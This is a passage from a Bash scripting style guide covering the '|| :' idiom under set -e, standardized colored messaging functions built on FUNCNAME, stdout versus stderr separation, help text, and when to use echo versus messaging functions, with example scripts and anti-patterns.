((condition)) && action || :
# - Traditional Unix idiom (dates to Bourne shell)
# - Built-in command (no fork)
# - 1 character (concise)
# - Standard in POSIX scripts
# - Slightly faster (no PATH lookup)

# ✓ ACCEPTABLE: true command
((condition)) && action || true
# - More explicit/readable for beginners
# - 4 characters (slightly more verbose)
# - Also a built-in (no performance difference in practice)
# - Common in modern scripts

# Both are correct; colon is traditional shell idiom
```

**Common patterns:**

**Pattern 1: Conditional variable declaration**

```bash
declare -i complete=0 verbose=0

# Declare extended variables only in complete mode
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :

# Print variables only in verbose mode
((verbose)) && declare -p NC RED GREEN YELLOW || :
```

**Pattern 2: Nested conditional declarations**

```bash
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
else
  declare -g NC='' RED=''
  ((complete)) && declare -g BLUE='' MAGENTA='' || :
fi
```

**Pattern 3: Conditional block execution**

```bash
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :
```

**Pattern 4: Multiple conditional actions**

```bash
declare -i flags=0 complete=0

if ((flags)); then
  declare -ig VERBOSE=${VERBOSE:-1}
  ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
fi
```

**Real-world example from color-set.sh:**

```bash
#!/bin/bash
# Dual-purpose script: sourceable library + executable demo

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0

  # Parse arguments to set flags
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose)  verbose=1 ;;
      always)   color=1 ;;
      never)    color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "$FUNCNAME: error: Invalid mode ${1@Q}"
                return 1 ;;
    esac
    shift
  done

  # Auto-detect if color not explicitly set
  ((color== -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; }

  # Declare flag variables only if flags mode active
  if ((flags)); then
    declare -ig VERBOSE=${VERBOSE:-1}
    # Only declare DEBUG/DRY_RUN/PROMPT in complete mode
    ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    # Always declare basic colors
    declare -g NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m'
    # Only declare extended colors in complete mode
    ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' || :
  else
    declare -g NC='' RED='' GREEN=''
    ((complete)) && declare -g BLUE='' MAGENTA='' BOLD='' || :
  fi

  # Print variables only in verbose mode
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE || :
    declare -p NC RED GREEN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT || :
      declare -p BLUE MAGENTA BOLD
    } || :
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: only execute when run directly
[[ ${BASH_SOURCE[0]} == "$0" ]] || return 0
#!/bin/bash #semantic
set -euo pipefail

color_set "$@"

#fin
```

This script demonstrates:
- Two-tier system (basic vs complete)
- Feature flags (flags mode)
- Multiple conditional declarations
- Safe handling under `set -e`
- All using `|| :` for exit code management

**When to use this pattern:**

**✓ Use `|| :` when:**

1. **Optional variable declarations** based on feature flags
   ```bash
   ((DEBUG)) && declare -g DEBUG_OUTPUT=/tmp/debug.log || :
   ```

2. **Conditional exports** for environment variables
   ```bash
   ((PRODUCTION)) && export PATH=/opt/app/bin:$PATH || :
   ```

3. **Feature-gated actions** that should be silent when disabled
   ```bash
   ((VERBOSE)) && echo "Processing $file" || :
   ((DRY_RUN)) && echo "Would execute: $command" || :
   ```

4. **Optional logging or debug output**
   ```bash
   ((LOG_LEVEL >= 2)) && log_debug "Variable value: $var" || :
   ```

5. **Tier-based variable sets** (like basic vs complete colors)
   ```bash
   ((FULL_FEATURES)) && declare -g EXTRA_VAR=value || :
   ```

**✗ Don't use when:**

1. **The action must succeed** - use explicit error handling instead
   ```bash
   # ✗ Wrong - suppresses critical errors
   ((required_flag)) && critical_operation || :

   # ✓ Correct - check explicitly
   if ((required_flag)); then
     critical_operation || die 1 'Critical operation failed'
   fi
   ```

2. **You need to know if it failed** - capture the exit code
   ```bash
   # ✗ Wrong - hides failure
   ((condition)) && risky_operation || :

   # ✓ Correct - handle failure
   if ((condition)) && ! risky_operation; then
     error 'risky_operation failed'
     return 1
   fi
   ```

3. **The condition itself is the operation** - use if statement
   ```bash
   # ✗ Awkward - condition is the operation
   ((count+=1)) && echo 'Incremented' || :

   # ✓ Clearer - just do the operation
   count+=1
   echo 'Incremented'
   ```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG: No || :, script exits when condition is false
((complete)) && declare -g BLUE=$'\033[0;34m'
# If complete=0, script exits with set -e!

# ✓ ACCEPTABLE: Double negative, less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'
# Logically equivalent but can sometimes be harder to understand

# ✗ WRONG: Using true instead of : (verbose, less idiomatic)
((complete)) && declare -g BLUE=$'\033[0;34m' || true
# Works but : is preferred in shell scripts

# ✗ WRONG: Complex fallback
((complete)) && declare -g BLUE=$'\033[0;34m' || { true; }
# Unnecessarily complex, just use :

# ✗ WRONG: Suppressing critical operations
((user_confirmed)) && delete_all_files || :
# If delete_all_files fails, error is hidden!

# ✓ CORRECT: Check critical operations explicitly
if ((user_confirmed)); then
  delete_all_files || die 1 'Failed to delete files'
fi
```

**Comparison of alternatives:**

**Alternative 1: if statement (most explicit)**

```bash
# ✓ Most readable, best for complex logic
if ((complete)); then
  declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m'
fi

# Pros: Crystal clear intent, no exit code issues
# Cons: More verbose (4 lines vs 1)
# Use when: Logic is complex or has multiple statements
```

**Alternative 2: Arithmetic test with `|| :`**

```bash
# ✓ Concise, safe under set -e
((complete)) && declare -g BLUE=$'\033[0;34m' || :

# Pros: One line, traditional idiom, safe
# Cons: Less obvious for beginners
# Use when: Simple conditional declaration
```

**Alternative 3: Double-negative pattern**

```bash
# ✓ Works but less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# Pros: No || : needed (fails when complete≠0, which is fine)
# Cons: Double negative can sometimes be confusing
```

**Alternative 4: Temporarily disable errexit**

```bash
# ✗ Not recommended - disables error checking
set +e
((complete)) && declare -g BLUE=$'\033[0;34m'
set -e

# Pros: None
# Cons: Disables error checking for all commands in between
# Use when: Never - use || : instead
```

**Testing the pattern:**

```bash
#!/bin/bash
set -euo pipefail

# Test 1: Verify false condition doesn't exit
test_false_condition() {
  local -i flag=0

  # Without || :, this would exit the script
  ((flag)) && echo "This won't print" ||:

  # Script continues
  echo "Test 1 passed: false condition didn't exit"
}

# Test 2: Verify true condition executes action
test_true_condition() {
  local -i flag=1
  local -- output=''

  # Action should execute
  ((flag)) && output="executed" || :

  [[ "$output" == "executed" ]] || {
    echo "Test 2 failed: true condition didn't execute"
    return 1
  }

  echo 'Test 2 passed: true condition executed action'
}

# Test 3: Verify nested conditionals
test_nested_conditionals() {
  local -i outer=1 inner=0
  local -i executed=0

  ((outer)) && {
    executed=1
    ((inner)) && executed=2 || :
  } || :

  ((executed == 1)) || {
    echo "Test 3 failed: expected executed=1, got $executed"
    return 1
  }

  echo 'Test 3 passed: nested conditionals work correctly'
}

# Test 4: Verify set -e still catches real errors
test_error_detection() {
  local -i flag=1

  # Real error should still exit
  if ((flag)) && false; then
    echo 'Test 4 failed: error not detected'
    return 1
  fi

  echo 'Test 4 passed: real errors still caught'
}

# Run tests
test_false_condition
test_true_condition
test_nested_conditionals
test_error_detection

echo 'All tests passed!'
#fin
```

**Summary:**

- **Use `|| :`** after `((condition)) && action` to prevent false conditions from triggering `set -e` exit
- **Colon `:` is preferred** over `true` (traditional shell idiom, concise)
- **Only for optional operations** - critical operations need explicit error handling
- **Document intent** with comments when the pattern might not be obvious
- **Test both paths** - verify behavior when condition is true and false
- **Cross-reference**: See BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)

**Key principle:** When you want conditional execution without risking script exit, use `((condition)) && action || :`. This makes your intent explicit: "Do this if condition is true, but don't exit if condition is false."


---


**Rule: BCS0700**

# Input/Output & Messaging

This section establishes standardized messaging patterns with color support for terminal output and proper stream handling. It defines the complete messaging suite: `_msg()` (core function using FUNCNAME), `vecho()` (verbose output), `success()` (success messages), `warn()` (warnings), `info()` (informational), `debug()` (debug output), `error()` (unconditional error to stderr), `die()` (exit with error), and `yn()` (yes/no prompts). It explains STDOUT vs STDERR separation (data vs diagnostics), proper usage documentation patterns, and when to use messaging functions versus bare echo statements. Error output must always go to STDERR with `>&2` placed at the beginning of commands for clarity.


---


**Rule: BCS0701**

## Standardized Messaging and Color Support
```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```


---


**Rule: BCS0702**

## STDOUT vs STDERR
- All error messages should go to `STDERR`
- Place `>&2` at the *beginning* commands for clarity

```bash
# Preferred format
somefunc() {
  >&2 echo "[$(date -Ins)]: $*"
}

# Also acceptable
somefunc() {
  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
}
```


---


**Rule: BCS0703**

## Core Message Functions

**Every script should implement a standard set of messaging functions that provide consistent, colored, contextual output. Use a private `_msg()` core function that detects the calling function via `FUNCNAME` to automatically format messages appropriately.**

**Rationale:**

- **Consistency**: Same message format across all scripts
- **Context**: `FUNCNAME` inspection automatically adds appropriate prefix/color
- **DRY Principle**: Single `_msg()` implementation reused by all messaging functions
- **Verbosity Control**: Conditional functions (`info`, `warn`) respect `VERBOSE` flag
- **Proper Streams**: Errors/warnings to stderr, regular output to stdout
- **User Experience**: Colors and symbols make output scannable
- **Debugging**: `DEBUG` flag enables detailed diagnostic output

**Core messaging function pattern:**

The pattern uses a private `_msg()` function that inspects `FUNCNAME[1]` (the calling function) to determine formatting.

### Understanding FUNCNAME Inspection

**The FUNCNAME array** is a Bash built-in that contains the current function call stack:
- `${FUNCNAME[0]}` = Current function name (`_msg` in this case)
- `${FUNCNAME[1]}` = Calling function name (`info`, `warn`, `error`, etc.)
- `${FUNCNAME[2]}` = Function that called the calling function
- And so on up the call stack

**Why this is powerful:**

Instead of passing a parameter (`_msg "INFO" "$message"`), we inspect `FUNCNAME[1]` to automatically detect **who called us**. This enables a single `_msg()` implementation to format differently based on caller.

**Call stack example:**
```bash
main() {
  process_file test.txt
}

process_file() {
  info "Processing ${1@Q}"
  # When info() calls _msg():
  #   FUNCNAME[0] = "_msg"     (current function)
  #   FUNCNAME[1] = "info"     (caller - this determines formatting!)
  #   FUNCNAME[2] = "process_file"
  #   FUNCNAME[3] = "main"
}
```

**Implementation:**

```bash
# Private core messaging function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  # Inspect FUNCNAME[1] to detect calling function
  # This determines which color/symbol to use
  case ${FUNCNAME[1]} in
    vecho)   ;;  # No special prefix
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;  # Other callers get plain prefix
  esac

  # Print each message argument on separate line
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}
```

**Benefits of FUNCNAME inspection:**
1. **DRY**: Single `_msg()` function, no duplication
2. **Automatic**: Caller doesn't pass formatting hint, it's detected automatically
3. **Consistent**: Impossible to pass wrong level (`info "ERROR: ..."` prevented)
4. **Maintainable**: Add new message types by adding wrapper functions, no `_msg()` changes needed
5. **Self-documenting**: Function name IS the message level

**Public wrapper functions:**

```bash
# Conditional output functions (respect VERBOSE flag)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output (respects DEBUG flag)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output (always shown)
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Usage examples:**

```bash
# Information (only shown if VERBOSE=1)
info 'Starting processing...'
info "Processing $count files"

# Success (only shown if VERBOSE=1)
success 'Build completed'
success "Installed to $PREFIX"

# Warning (only shown if VERBOSE=1)
warn 'Configuration file not found, using defaults'
warn "Deprecated option: $old_option"

# Error (always shown)
error 'Failed to connect to server'
error "Invalid file: $filename"

# Debug (only shown if DEBUG=1)
debug "Variable state: count=$count, file=$file"
debug 'Entering cleanup phase'

# Exit with error message
die 1 'Critical error occurred'
die 2 "Invalid argument ${arg@Q}"
die 22 "File not found ${file@Q}"

# Exit without message (just return code)
die 1
```

**Why stdout vs stderr matters:**

```bash
# info/warn/error go to stderr (>&2)
# This allows:

# 1. Separating data output from messages
data=$(./script.sh)  # Gets only data, not info messages

# 2. Redirecting errors separately
./script.sh 2>errors.log  # Errors to file, data to stdout

# 3. Piping data while seeing messages
./script.sh | process_data  # Messages visible, data piped
```

**Color definitions:**

```bash
# Standard colors (conditional on terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Flag variables:**

```bash
# Global flags controlling output
declare -i VERBOSE=0  # Set to 1 for info/warn/success messages
declare -i DEBUG=0    # Set to 1 for debug messages
declare -i PROMPT=1   # Set to 0 to disable prompts (for automation)
```

**Complete messaging function set:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global flags
declare -i VERBOSE=0
declare -i DEBUG=0
declare -i PROMPT=1

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Messaging Functions
# ============================================================================

# Core message function using FUNCNAME for context
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

# Conditional output based on verbosity
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug output
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error output
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Yes/no prompt
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

# ============================================================================
# Main script logic
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -d|--debug)   DEBUG=1 ;;
    -y|--yes)     PROMPT=0 ;;
    *)            die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG PROMPT

  info "Starting $SCRIPT_NAME $VERSION"
  debug 'Debug mode enabled'

  # Example operations
  info 'Processing files...'
  success 'Files processed'

  if yn 'Continue with deployment?'; then
    info 'Deploying...'
    success 'Deployment complete'
  else
    warn 'Deployment skipped'
  fi
}

main "$@"
#fin
```

**Alternative: Simplified _msg without colors:**

For scripts that don't need colors:

```bash
_msg() {
  local -- level="${FUNCNAME[1]}"
  printf '%s: %s: %s\n' "$SCRIPT_NAME" "${level^^}" "$*"
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die()     { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Variation: Log to file:**

```bash
LOG_FILE=/var/log/"$SCRIPT_NAME".log

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    # Print to terminal with colors
    printf '%s %s\n' "$prefix" "$msg"

    # Log to file without colors (strip ANSI codes)
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using echo directly
echo "Error: file not found"
# Problems:
# 1. Not going to stderr
# 2. No script name prefix
# 3. No color
# 4. Not respecting VERBOSE

# ✓ Correct - use messaging function
error 'File not found'

# ✗ Wrong - duplicating message logic
info() {
  echo "[$SCRIPT_NAME] INFO: $*"
}
warn() {
  echo "[$SCRIPT_NAME] WARN: $*"
}
error() {
  echo "[$SCRIPT_NAME] ERROR: $*"
}
# Lots of duplication!

# ✓ Correct - use _msg core function
_msg() {
  local -- prefix="$SCRIPT_NAME:"
  case "${FUNCNAME[1]}" in
    info)  prefix+=" INFO:" ;;
    warn)  prefix+=" WARN:" ;;
    error) prefix+=" ERROR:" ;;
  esac
  echo "$prefix $*"
}
info()  { _msg "$@"; }
warn()  { _msg "$@"; }
error() { >&2 _msg "$@"; }

# ✗ Wrong - errors to stdout
error() {
  echo "[ERROR] $*"  # Goes to stdout!
}

# ✓ Correct - errors to stderr
error() {
  >&2 _msg "$@"
}

# ✗ Wrong - ignoring VERBOSE flag
info() {
  >&2 _msg "$@"
}
# Always prints, even when VERBOSE=0!

# ✓ Correct - check VERBOSE
info() {
  ((VERBOSE)) || return 0
  >&2 _msg "$@"
}

# ✗ Wrong - die without exit code
die() {
  error "$@"
  exit 1  # Always exit 1, can't customize
}

# ✗ Wrong - inefficient
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ✓ Correct - die with exit code parameter
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ✗ Acceptable only if prompting is unconditional
yn() {
  local reply
  read -r -n 1 -p "$1 y/n " reply
  [[ ${reply,,} == y ]]
}
# Can't disable prompts for automation!

# ✓ Correct - yn() respects PROMPT flag
yn() {
  ((PROMPT)) || return 0  # Non-interactive mode
  local reply
  >&2 read -r -n 1 -p "$SCRIPT_NAME: $1 y/n " reply
  >&2 echo
  [[ ${reply,,} == y ]]
}

# ✓ Correct - if warn() defined in script
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

**Function variants for different needs:**

**Minimal set (no colors, no flags):**

```bash
info()  { >&2 echo "$SCRIPT_NAME: $*"; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Medium set (with VERBOSE, no colors):**

```bash
declare -i VERBOSE=0

info()  { ((VERBOSE)) && >&2 echo "$SCRIPT_NAME: $*"; return 0; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Full set (with colors, flags, _msg core):**

See complete example above.

**Summary:**

- **Use _msg() core function** with FUNCNAME inspection for DRY implementation
- **Conditional functions** (`info`, `warn`) respect `VERBOSE` flag
- **Unconditional functions** (`error`) always display
- **Errors to stderr**: `>&2` prefix on error/warn/info functions
- **Colors conditional** on terminal output: `[[ -t 1 && -t 2 ]]`
- **die() takes exit code** as first parameter: `die 1 'Error message'`
- **yn() respects PROMPT** flag for non-interactive mode
- **Consistent prefix**: Every message shows script name
- **Remove unused** functions in production (see Section 6)

**Key principle:** Messaging functions provide a consistent, professional user interface. The _msg() core function with FUNCNAME inspection eliminates code duplication and makes adding new message types trivial. Always separate informational output (stderr) from data output (stdout).


---


**Rule: BCS0704**

## Usage Documentation
```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
  # Example 2
  $SCRIPT_NAME -qn 10 file.txt
EOT
}
```


---


**Rule: BCS0705**

## Echo vs Messaging Functions

**Choose between plain `echo` and messaging functions based on the context, formatting requirements, and output destination. Use messaging functions for operational status updates that respect verbosity settings, and plain `echo` for data output and structured documentation that must always display.**

**Rationale:**

- **Stream Separation**: Messaging functions go to stderr (user-facing), `echo` goes to stdout (data/parseable output)
- **Verbosity Control**: Messaging functions respect `VERBOSE` flag, `echo` always displays (critical for pipeable data)
- **Consistent Formatting**: Messaging functions provide uniform prefixes, colors, and script name identification
- **Output Purpose**: Operational messages vs data output require different handling
- **Parseability**: Plain `echo` output is predictable and parseable; messaging functions include formatting
- **Script Composition**: Using proper streams allows scripts to be combined in pipelines without mixing data and status messages

**When to use messaging functions (`info`, `success`, `warn`, `error`):**

**1. Operational status updates:**

```bash
# Script progress indicators
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'

# Processing notifications
info "Processing file $count of $total"
success "Processed $filename successfully"
```

**2. User-facing diagnostic information:**

```bash
# Diagnostic output
debug "Variable state: count=$count, total=$total"
debug 'Entering validation phase'

# Configuration feedback
info "Using configuration file ${config_file@Q}"
info "Timeout set to $timeout seconds"
```

**3. Messages that should respect verbosity:**

```bash
# Only shown if VERBOSE=1
info 'Checking prerequisites...'
info 'Loading configuration...'
success 'All checks passed'

# Always shown (errors)
error 'Configuration file not found'
die 1 'Critical dependency missing'
```

**4. Messages needing visual formatting:**

```bash
# Color-coded status
success 'Build completed'        # Green checkmark
warn 'Using default settings'    # ▲ Yellow warning
error 'Compilation failed'       # Red X
info 'Tests running...'          # Cyan info icon
```

**When to use plain `echo`:**

**1. Data output (stdout):**

```bash
# Function returns data
get_user_email() {
  local -- username=$1
  local -- email

  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)

  echo "$email"  # Data output - must use echo
}

# Caller can capture output
user_email=$(get_user_email 'alice')
```

**2. Help text and documentation:**

```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
```

**3. Structured multi-line output:**

```bash
# Report generation
generate_report() {
  echo 'System Report'
  echo '============='
  echo
  echo 'Disk Usage:'
  df -h
  echo
  echo 'Memory Usage:'
  free -h
  echo
  echo 'Load Average:'
  uptime
}
```

**4. Output intended for parsing or piping:**

```bash
# List output for processing
list_users() {
  local -- user

  while IFS=: read -r user _; do
    echo "$user"
  done < /etc/passwd
}

# Can be piped or processed
list_users | grep '^admin' | wc -l
```

**5. Output that should always display regardless of verbosity:**

```bash
# Results that user explicitly requested
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Final summary output
echo "Processed $success_count files successfully"
echo "Failed: $fail_count files"
```

**Decision matrix:**

```bash
# Is this operational status or data?
#   Status → messaging function
#   Data   → echo

# Should this respect verbosity settings?
#   Yes → messaging function (info, warn, debug)
#   No  → echo (or error for critical messages)

# Will this be parsed or piped?
#   Yes → echo to stdout
#   No  → messaging function to stderr

# Is this multi-line formatted output?
#   Yes → echo (with here-doc or multiple statements)
#   No  → messaging function (single-line status)

# Does this need color/formatting?
#   Yes → messaging function
#   No  → echo
```

**Complete example showing both:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Messaging Functions (stderr, with verbosity control)
# ============================================================================

declare -i VERBOSE=1 DEBUG=0

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'  # No Color (reset)
else
  # Not a terminal - disable colors
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}
# Conditional output based on verbosity
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Debug output
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
# Unconditional error output
error()   { >&2 _msg "$@"; }
# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Data Functions (stdout, always output)
# ============================================================================

# Return user's home directory (data output)
get_user_home() {
  local -- username=$1
  local -- home_dir

  home_dir=$(getent passwd "$username" | cut -d: -f6)

  [[ -n "$home_dir" ]] || return 1

  echo "$home_dir"  # Data to stdout
}

# Generate structured report (data output)
show_report() {
  echo 'User Report'
  echo '==========='
  echo
  echo "Username: $USER"
  echo "Home: $HOME"
  echo "Shell: $SHELL"
  echo
  echo 'Disk Usage:'
  df -h "$HOME" | tail -n 1
}

# ============================================================================
# Documentation Functions (stdout, always output)
# ============================================================================

show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}

# ============================================================================
# Main Logic
# ============================================================================

main() {
  local -- username
  local -- user_home
  local -i num=420

  # Parse arguments (messaging functions for progress)
  while (($#)); do case $1 in
    -n|--num)     shift
                  num=${1:-$num}
                  ;;
    -v|--verbose) VERBOSE+=1
                  ;;
    -q|--quiet)   VERBOSE=0
                  ;;
    -D|--debug)   DEBUG=1
                  ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"
                  return 0
                  ;;
    -h|--help)    show_help
                  return 0
                  ;;
    --)           shift; break
                  ;;
    -[nvqDVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                  ;;
    -*)           error "Invalid option ${1@Q}"
                  return 22
                  ;;
    *)            break
                  ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG

  # Validate arguments (error message)
  if (($# != 1)); then
    error 'Expected exactly one argument'
    show_help
    return 22
  fi

  username="$1"

  # Operational status (messaging functions to stderr)
  info "Looking up user ${username@Q}"

  # Get data (echo to stdout)
  if ! user_home=$(get_user_home "$username"); then
    error "User not found ${username@Q}"
    return 1
  fi

  # Operational status (messaging function)
  success "Found user ${username@Q}"

  # Data output (echo to stdout) - always displays
  show_report

  # Operational status (messaging function)
  info 'Report generation complete'
}

main "$@"
#fin
```

**Running the example:**

```bash
# Without verbose - only data output and errors
$ ./script.sh -q alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home

# With verbose - operational messages visible (to stderr)
